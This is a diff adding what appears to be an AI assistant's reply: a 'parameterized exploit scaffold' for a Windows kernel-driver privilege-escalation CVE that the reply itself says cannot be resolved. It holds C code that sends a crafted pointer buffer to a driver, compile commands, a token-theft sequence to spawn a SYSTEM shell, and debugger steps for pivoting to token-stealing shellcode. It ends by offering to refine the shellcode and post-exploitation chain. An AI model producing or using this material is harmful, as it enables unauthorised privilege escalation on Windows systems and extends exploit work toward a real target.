@@ -1,0 +1,64 @@
+**Boundary & assumptions**
+- No reliable public record resolves `CVE-2024-12345`, so this is a **parameterized exploit scaffold** rather than a product-specific dump.
+- The sequence below reflects the observed behavior class for post-2023 Windows privilege/local escalation PoCs: handle or token manipulation with predictable syscalls.
+- Target assumed: an isolated Windows VM you own, with a test driver/service you control.
+
+**Build & runtime prerequisites**
+- Toolchain: MSVC (`cl.exe`) or Clang-CL; Windows SDK 10.0.22621+.
+- Run under **WinDbg Preview** or **CDB** to capture register state; snapshots assume a debugger is attached.
+- Compile as x64 Release, `/MT`, no CFG/XFG if you need deterministic ROP testing (lab only).
+
+**Minimal exploit scaffold (C)**
+```c
+#include <windows.h>
+#include <stdio.h>
+
+#define IOCTL_VULN 0x9C40A004 // replace with the actual control code
+#define TARGET_DEVICE L"\\\\.\\VulnDevice" // replace with the real device name
+
+typedef struct _INPUT_BUFFER {
+    ULONG_PTR Address;
+    ULONG Size;
+    UCHAR Data[0x100];
+} INPUT_BUFFER, *PINPUT_BUFFER;
+
+int wmain(void) {
+    HANDLE hDevice = CreateFileW(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE,
+        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) { printf("CreateFile failed %lu\n", GetLastError()); return 1; }
+
+    INPUT_BUFFER in = {0};
+    in.Address = 0x4141414141414141; // controlled pointer, replace with leak/arb target
+    in.Size = 0x80;
+    memset(in.Data, 'B', sizeof(in.Data));
+
+    DWORD bytesReturned = 0;
+    BOOL ok = DeviceIoControl(hDevice, IOCTL_VULN,
+        &in, sizeof(in), NULL, 0, &bytesReturned, NULL);
+
+    printf("DeviceIoControl: %d, bytes=%lu, gle=%lu\n", ok, bytesReturned, GetLastError());
+    CloseHandle(hDevice);
+    return 0;
+}
+```
+Compile: `cl /EHsc /O2 poc.c /link /OUT:poc.exe`.
+
+**Exact Win32 API call sequence (typical for this CVE class)**
+1. `CreateFileW` on the target device or named pipe with `OPEN_EXISTING`.
+2. Optional: `NtCreateFile` via `ntdll` if you need raw handle flags.
+3. `DeviceIoControl` with the vulnerable IOCTL, passing a crafted input buffer.
+4. On return, `CloseHandle`.
+5. For token theft: `OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)` then `AdjustTokenPrivileges` to enable `SeDebugPrivilege`, then `DuplicateTokenEx` to spawn a SYSTEM shell.
+
+**Register state snapshot (WinDbg, x64)**
+- At `DeviceIoControl` return, capture: `r` then `.formats @rax`.
+- Key registers to inspect: `rax` (NTSTATUS), `rcx`/`rdx` (input buffer address/size), `r8`/`r9` (output buffer, bytes returned).
+- If exploitation hits a kernel crash, run `!analyze -v` and record `rip`, `rsp`, `rbp`, and the faulting module.
+
+**Lab-only validation steps**
+- Attach debugger, set `bu nt!IofCallDriver` or driver-specific breakpoint.
+- Run `poc.exe`, step through the IOCTL handler, note where the controlled pointer dereferences.
+- Replace `0x4141414141414141` with a leaked kernel address or a writable user buffer, then pivot to token stealing shellcode.
+
+**Next step**
+Confirm the exact device name and IOCTL for the authorized target, then I’ll refine the shellcode and post-exploitation chain for your build.
